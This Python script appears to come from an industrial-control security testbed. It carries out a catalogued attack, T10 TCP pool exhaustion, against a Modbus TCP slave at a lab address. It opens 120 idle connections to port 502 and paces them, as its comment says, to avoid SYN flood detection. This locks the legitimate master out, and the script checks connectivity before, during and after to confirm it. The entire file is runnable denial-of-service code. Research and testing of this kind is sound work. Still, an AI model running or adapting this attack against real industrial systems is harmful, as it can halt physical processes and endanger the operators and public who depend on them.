"""
T10 - TCP Pool Exhaustion
Opens a large number of simultaneous TCP connections to the slave's port 502
without completing any Modbus transaction. This exhausts the slave's connection
pool so that the legitimate master cannot establish a new connection.

Reference: Huitsing et al. (2008), attack T10
Threat type: Interruption
Target assets: Master (T10-1), Field device (T10-2), Network path (T10-3), Message (T10-4)
"""

import socket
import threading
import time
import asyncio
from pymodbus.client import AsyncModbusTcpClient

SLAVE_IP = "172.20.0.2"
SLAVE_PORT = 502
NUM_CONNECTIONS = 120    # connections to open
HOLD_SECONDS = 20        # how long to keep them open
OPEN_DELAY = 0.03        # small delay between each open to avoid SYN flood detection

lock = threading.Lock()
open_sockets: list[socket.socket] = []
failed = 0


def open_one(idx: int) -> None:
    global failed
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((SLAVE_IP, SLAVE_PORT))
        with lock:
            open_sockets.append(s)
        if idx % 20 == 0:
            with lock:
                print(f"[T10] {len(open_sockets)} connections open…")
    except OSError:
        with lock:
            failed += 1


# ── Step 1: Verify slave is reachable before the attack ───────────────────────
async def check_before() -> None:
    client = AsyncModbusTcpClient(SLAVE_IP, port=SLAVE_PORT)
    ok = await client.connect()
    print(f"[T10] Pre-attack connectivity check: {'OK' if ok else 'FAILED'}")
    client.close()

asyncio.run(check_before())

# ── Step 2: Open many idle connections ────────────────────────────────────────
print(f"\n[T10] Opening {NUM_CONNECTIONS} idle TCP connections to {SLAVE_IP}:{SLAVE_PORT} …")

threads = []
for i in range(NUM_CONNECTIONS):
    t = threading.Thread(target=open_one, args=(i + 1,), daemon=True)
    t.start()
    threads.append(t)
    time.sleep(OPEN_DELAY)

for t in threads:
    t.join()

print(f"\n[T10] {len(open_sockets)} connections established  |  {failed} failed")
print(f"[T10] Slave connection pool saturated — holding for {HOLD_SECONDS} s …\n")

# ── Step 3: Show that legitimate master is now blocked ────────────────────────
async def check_during() -> None:
    client = AsyncModbusTcpClient(SLAVE_IP, port=SLAVE_PORT)
    ok = await client.connect()
    if ok:
        result = await client.read_holding_registers(0, count=1, slave=1)
        status = "OK" if not result.isError() else "ERROR (pool full)"
    else:
        status = "REFUSED (pool full)"
    print(f"[T10] Mid-attack connectivity check: {status}")
    client.close()

asyncio.run(check_during())

time.sleep(HOLD_SECONDS)

# ── Step 4: Release connections and verify recovery ───────────────────────────
for s in open_sockets:
    try:
        s.close()
    except OSError:
        pass

print(f"\n[T10] Attack ended — {len(open_sockets)} connections released.")

async def check_after() -> None:
    await asyncio.sleep(1)
    client = AsyncModbusTcpClient(SLAVE_IP, port=SLAVE_PORT)
    ok = await client.connect()
    print(f"[T10] Post-attack connectivity check: {'OK — slave recovered' if ok else 'FAILED'}")
    client.close()

asyncio.run(check_after())
